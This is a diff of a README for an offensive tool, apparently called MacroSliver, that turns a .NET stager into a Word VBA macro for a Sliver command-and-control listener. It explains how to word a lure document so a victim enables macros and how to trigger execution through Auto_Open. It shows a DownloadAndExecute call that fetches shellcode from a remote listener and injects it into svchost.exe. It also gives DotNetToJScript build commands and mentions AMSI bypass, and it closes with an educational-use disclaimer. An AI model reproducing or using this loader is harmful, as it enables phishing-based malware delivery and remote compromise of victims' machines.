@@ -58,7 +58,7 @@ stage-listener --url https://192.168.X.X:8080 --profile lab -c /tmp/crt.crt -k /
 This will result in two jobs running on ports `443` and `8080`, both with TLS enabled.
 
 ### Macro Usage
-The file macrosliver.vba contains the VBA code that is directly usable in Word. Create a .docm file with convincing text to prompt the victim to enable macro execution, ensuring that the Run() function is triggered, for example, by calling it in the Auto_Open() trigger or a similar method, to catch the session with the instantiated listener. When the VBA function is executed, it deserializes the embedded stager DLL and invokes it. After that, the functions of the loader class can be called using the object o.
+The file `macrosliver.vba` contains the VBA code that is directly usable in Word. Create a `.docm` file with convincing text to prompt the victim to enable macro execution, ensuring that the `Run()` function is triggered, for example, by calling it in the `Auto_Open()` trigger or a similar method, to catch the session with the instantiated listener. When the VBA function is executed, it deserializes the embedded stager DLL and invokes it. After that, the functions of the loader class can be called using the object `o`.
 ```VBA
     Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
     o.DownloadAndExecute "https://192.168.X.X:8080/hello.woff", "svchost.exe", "deflate9", "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT", "8y/B?E(G+KbPeShV"
@@ -66,9 +66,68 @@ The file macrosliver.vba contains the VBA code that is directly usable in Word. 
 The arguments to pass are:
 1. The stage listener URL where the shellcode is hosted.
 2. The binary into which the process should be injected.
-3. The compression algorithm: either deflate9, gzip, or an empty string if no compression was chosen when the listener was created.
+3. The compression algorithm: either `deflate9`, `gzip`, or an empty string if no compression was chosen when the listener was created.
 4. The AES key.
 5. The AES initialization vector.
 
+## Build the assembly
 
+The assembly can also be built by yourself if additional functionality is needed or if further obfuscation and AMSI bypass are required. To do this, open the solution file and build the integrated MacroSliver Project. It has to be built for the Any CPU configuration and does not need to be specified for a particular architecture. This allows the stage listener to provide the correct architecture for the target Office version.
+
+The changes to the original stager include the handling of decompression in .NET v2 compared to .NET v4 and the AES decryption class. Additionally, VBA passes all parameters as strings rather than byte arrays, as in the original stager. So the aes key and iv are passed as strings.
+
+After the assembly has been built, it can be used to create a VBA, HTA, or JScript script with DotNetToJScript.
+
+## Create the Script
+To generate the VBA script using DotNetToJScript, follow these steps:
+
+1. Build DotNetToJScript: Clone and build the DotNetToJScript project from (GitHub)[https://github.com/tyranid/DotNetToJScript].
+2. Prepare the necessary files: Copy the DotNetToJScript.exe, NDesk.Options.dll (created during the build process), and MacroSliver.dll into the same folder.
+3. Execute the command: Run the following command to generate the VBA script.
+
+Here are the detailed steps:
+
+### Step 1: Build DotNetToJScript
+1. Clone the DotNetToJScript repository:
+```bash
+git clone https://github.com/tyranid/DotNetToJScript.git
+```
+2. Navigate to the DotNetToJScript directory and build the project:
+```bash
+cd DotNetToJScript
+msbuild /p:Configuration=Release
+```
+### Step 2: Prepare the Files
+1. Copy `DotNetToJScript.exe` and `NDesk.Options.dll` from the build output directory (usually `bin\Release`) to a new folder.
+2. Copy your `MacroSliver.dll` to the same folder.
+### Step 3: Execute the Command
+1. Open a command prompt in the folder containing `DotNetToJScript.exe`, `NDesk.Options.dll`, and `MacroSliver.dll`.
+2. Run the following command to generate the VBA script:
+```
+.\DotNetToJScript.exe .\MacroSliver.dll --lang=vba --ver=v2 -c=Loader -o macrosliver.vba
+```
+This command will create a `macrosliver.vba` file that contains the VBA script generated from the `MacroSliver.dll`.
+Finally add the call of `DownloadAndExecute` to trigger the stager instantiation.
+```VBA
+    o.DownloadAndExecute "https://192.168.X.X:8080/hello.woff", "svchost.exe", "deflate9", "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT", "8y/B?E(G+KbPeShV"
+```
+
+## Disclaimer
+**WARNING: This repository contains malware and potentially harmful code. It is intended for educational purposes only.**
+
+### Important Information
+**Purpose:** The contents of this repository are provided for research and educational purposes only. The goal is to help security professionals, researchers, and students understand malware, its behavior, and methods to detect and mitigate it.
+
+**Legal Use:** You are strictly prohibited from using any code or information from this repository for malicious purposes or illegal activities. Unauthorized use of this material to cause harm, breach security, or compromise systems is against the law and strictly forbidden.
+
+**Responsibility:** The authors and contributors of this repository do not take any responsibility for any damage or harm caused by the use or misuse of the content provided herein. Users are fully responsible for their actions and must comply with all applicable laws and regulations.
+
+**Safe Environment:** Always use a controlled, isolated, and safe environment, such as a virtual machine or sandbox, when testing or experimenting with the code in this repository. Ensure that your testing environment is disconnected from any networks to prevent unintended spread or damage.
+
+**Ethical Use:** This repository aims to promote ethical hacking, cybersecurity awareness, and the development of effective defenses against malware. By using this repository, you agree to adhere to ethical guidelines and use the content responsibly.
+
+### Acknowledgment
+By accessing, cloning, or using any part of this repository, you acknowledge that you have read, understood, and agree to this disclaimer. You also acknowledge that you will use the information responsibly and ethically.
+
+**If you do not agree with the terms outlined above, do not access or use the contents of this repository.**
 
